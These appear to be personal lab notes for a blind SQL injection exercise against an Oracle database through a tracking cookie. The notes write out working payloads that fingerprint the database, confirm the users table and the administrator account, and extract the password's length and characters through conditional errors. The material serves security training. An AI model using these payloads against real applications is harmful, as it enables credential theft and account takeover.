Blind SQLi injection with conditional errors

Vulnerable parameter - tracking cookie

End Goal-
Enumerate the administrator password
Login as administartor

Analysis:

1) prove that parameter is Vulnerable
we added single '' and there is no error, so lets try concatenating injection

' || (select '') ||' this is valid query but we are still getiing error which means this is oracle database which requires FROM table
' || (select '' FROM DUAL) || '-- no error so it is oracle database.

2) Confirm users table exists in database.
' || (select '' FROM users where rownum=1) || '
rownum is included otherwise there would be a empty space for every entry in database  so we are trying to limit the entry to one.

3) Confirm administartor user exists
' || (select '' FROM users where username='administartor') || '
we would get a 200 response even if the username administartor not exists so we need to use a conditional
' || (select  CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administartor') || '

Here the catch is database performs the FROM query first and then the conditional clause so first if the user exists in the conditional 1=1 is always true and TO_CHAR(1/0) should throw an error
if the username doesnot exists then else will execute and throws no error.

4) Determine the length of the password
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>1) || '
We are getting a 200 response from length 21 in the intruder so the length is 20.

5) Output the administrator password
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1)='a' || '